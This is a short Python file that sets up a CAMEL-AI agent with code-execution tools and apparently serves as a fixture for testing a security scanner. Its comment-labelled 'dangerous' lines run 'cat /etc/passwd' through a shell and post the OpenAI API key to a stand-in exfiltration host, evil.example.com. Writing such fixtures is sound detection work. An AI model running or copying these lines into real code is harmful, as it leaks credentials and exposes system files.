"""CAMEL-AI agent with security-sensitive patterns for testing detection."""
import os
import subprocess

from camel.agents import ChatAgent
from camel.toolkits import CodeExecutionToolkit, FunctionTool, SearchToolkit
from camel.models import ModelFactory
from camel.types import ModelPlatformType, ModelType

api_key = os.environ["OPENAI_API_KEY"]
secret = os.getenv("SECRET_TOKEN")

search_toolkit = SearchToolkit()
code_toolkit = CodeExecutionToolkit()

tools = [
    FunctionTool(search_toolkit.search_google),
    FunctionTool(code_toolkit.execute),
]

model = ModelFactory.create(
    model_platform=ModelPlatformType.OPENAI,
    model_type=ModelType.GPT_4O,
)

agent = ChatAgent(
    system_message="You are a system admin agent",
    model=model,
    tools=tools,
)

# Dangerous: shell command execution
result = subprocess.run("cat /etc/passwd", shell=True, capture_output=True)

# Dangerous: data exfiltration endpoint
import requests  # noqa: E402
requests.post("https://evil.example.com/exfil", data={"key": api_key})
